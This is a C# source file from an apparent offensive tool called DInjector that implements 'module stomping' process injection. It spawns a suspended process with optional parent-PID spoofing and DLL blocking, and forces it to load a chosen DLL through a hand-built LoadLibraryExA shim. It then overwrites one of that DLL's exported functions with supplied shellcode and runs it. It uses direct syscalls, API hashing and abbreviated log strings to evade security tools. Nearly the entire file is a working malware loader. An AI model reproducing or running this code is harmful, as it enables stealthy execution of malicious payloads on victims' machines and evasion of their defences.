using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    /// <summary>
    /// Stolen from:
    /// https://offensivedefence.co.uk/posts/module-stomping/
    /// https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Stomper.cs
    /// </summary>
    public class ModuleStomping
    {
        static byte[] GenerateShim(long loadLibraryExP)
        {
            using var ms = new MemoryStream();
            using var bw = new BinaryWriter(ms);

            bw.Write((ulong)loadLibraryExP);
            var loadLibraryExBytes = ms.ToArray();

            return new byte[] {
                0x48, 0xB8, loadLibraryExBytes[0], loadLibraryExBytes[1], loadLibraryExBytes[2], loadLibraryExBytes[3], loadLibraryExBytes[4], loadLibraryExBytes[5], loadLibraryExBytes[6],loadLibraryExBytes[7],
                0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
                0x48, 0x31, 0xD2,
                0xFF, 0xE0
            };
        }

        public static void Execute(byte[] shellcode, string processImage, string moduleName, string exportName, int ppid = 0, bool blockDlls = false, bool am51 = false, bool debug = false)
        {
            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                @"C:\Windows\System32",
                suspended: true,
                ppid: ppid,
                blockDlls: blockDlls,
                am51: am51);

            #endregion

            #region GenerateShim

            var kernel32 = DI.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
            // { API_HASHING:LoadLibraryExA }
            var loadLibraryEx = DI.DynamicInvoke.Generic.GetExportAddress(kernel32, "c106e6bed4fb14d50b1485713551941a", 0x220b3d05);

            var shim = GenerateShim((long)loadLibraryEx);
            var bModuleName = Encoding.ASCII.GetBytes(moduleName);

            #endregion

            #region NtAllocateVirtualMemory (bModuleNameLength, PAGE_READWRITE)

            IntPtr hProcess = pi.hProcess;
            var allocModule = IntPtr.Zero;
            var regionSize = new IntPtr(bModuleName.Length + 2);

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref allocModule,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtAllctVrtlMmry (bModuleNameLength), PAGE_READWRITE");
            else
                throw new Exception($"(ModuleStomping) [-] NtAllctVrtlMmry (bModuleNameLength), PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtAllocateVirtualMemory (shimLength, PAGE_READWRITE)

            var allocShim = IntPtr.Zero;
            regionSize = new IntPtr(shim.Length);

            ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref allocShim,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtAllctVrtlMmry (shimLength), PAGE_READWRITE");
            else
                throw new Exception($"(ModuleStomping) [-] NtAllctVrtlMmry (shimLength), PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (bModuleName)

            var buffer = Marshal.AllocHGlobal(bModuleName.Length);
            Marshal.Copy(bModuleName, 0, buffer, bModuleName.Length);

            uint bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                allocModule,
                buffer,
                (uint)bModuleName.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtWrtVrtlMmry (bModuleName)");
            else
                throw new Exception($"(ModuleStomping) [-] NtWrtVrtlMmry (bModuleName): {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtWriteVirtualMemory (shim)

            buffer = Marshal.AllocHGlobal(shim.Length);
            Marshal.Copy(shim, 0, buffer, shim.Length);

            bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                allocShim,
                buffer,
                (uint)shim.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtWrtVrtlMmry (shim)");
            else
                throw new Exception($"(ModuleStomping) [-] NtWrtVrtlMmry (shim): {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (shim, PAGE_EXECUTE_READ)

            IntPtr protectAddress = allocShim;
            regionSize = new IntPtr(shim.Length);
            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtPrtctVrtlMmry (shim), PAGE_EXECUTE_READ");
            else
                throw new Exception($"(ModuleStomping) [-] NtPrtctVrtlMmry (shim), PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtCreateThreadEx (shim)

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                allocShim,
                allocModule,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtCrtThrdEx (shim)");
            else
                throw new Exception($"(ModuleStomping) [-] NtCrtThrdEx (shim): {ntstatus}");

            #endregion

            #region NtWaitForSingleObject (inf)

            Win32.LARGE_INTEGER liInf = new Win32.LARGE_INTEGER() { QuadPart = 0x7FFFFFFFFFFFFFFF };

            ntstatus = Syscalls.NtWaitForSingleObject(
                hThread,
                false,
                ref liInf);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtWtFrSnglObjct|STATUS_SUCCESS, timeout");
            else if (ntstatus == NTSTATUS.Timeout)
                Console.WriteLine("(ModuleStomping) [+] NtWtFrSnglObjct|STATUS_TIMEOUT, timeout");
            else
                throw new Exception($"(ModuleStomping) [-] NtWtFrSnglObjct, inf: {ntstatus}");

            #endregion

            #region NtFreeVirtualMemory (allocModule)

            regionSize = new IntPtr(bModuleName.Length + 2);

            ntstatus = Syscalls.NtFreeVirtualMemory(
                hProcess,
                ref allocModule,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_RELEASE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtFrVrtlMmry (allocModule)");
            else
                throw new Exception($"(ModuleStomping) [-] NtFrVrtlMmry (allocModule): {ntstatus}");

            #endregion

            #region NtFreeVirtualMemory (allocShim)

            regionSize = new IntPtr(shim.Length);

            ntstatus = Syscalls.NtFreeVirtualMemory(
                hProcess,
                ref allocShim,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_RELEASE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtFrVrtlMmry (allocShim)");
            else
                throw new Exception($"(ModuleStomping) [-] NtFrVrtlMmry (allocShim): {ntstatus}");

            #endregion

            Syscalls.NtClose(hThread);

            #region Find targetAddress

            var hModule = DI.DynamicInvoke.Generic.LoadModuleFromDisk(moduleName);
            var export = DI.DynamicInvoke.Generic.GetExportAddress(hModule, DI.DynamicInvoke.Generic.GetAPIHash(exportName, 0x31337), 0x31337);
            var offset = (long)export - (long)hModule;

            var targetAddress = IntPtr.Zero;
            using var process = Process.GetProcessById((int)pi.dwProcessId);

            foreach (ProcessModule module in process.Modules)
            {
                if (!module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase)) continue;

                targetAddress = new IntPtr((long)module.BaseAddress + offset);
                break;
            }

            #endregion

            #region NtProtectVirtualMemory (shellcode, PAGE_READWRITE)

            protectAddress = targetAddress;
            regionSize = new IntPtr(shellcode.Length);
            oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_READWRITE,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtPrtctVrtlMmry (shellcode), PAGE_READWRITE");
            else
                throw new Exception($"(ModuleStomping) [-] NtPrtctVrtlMmry (shellcode), PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                targetAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtWrtVrtlMmry (shellcode)");
            else
                throw new Exception($"(ModuleStomping) [-] NtWrtVrtlMmry (shellcode): {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (shellcode, PAGE_EXECUTE_READ)

            protectAddress = targetAddress;
            oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtPrtctVrtlMmry (shellcode), PAGE_EXECUTE_READ");
            else
                throw new Exception($"(ModuleStomping) [-] NtPrtctVrtlMmry (shellcode), PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtCreateThreadEx (shellcode)

            hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                targetAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ModuleStomping) [+] NtCrtThrdEx (shellcode)");
            else
                throw new Exception($"(ModuleStomping) [-] NtCrtThrdEx (shellcode): {ntstatus}");

            #endregion

            Syscalls.NtClose(hThread);
            Syscalls.NtClose(hProcess);
        }
    }
}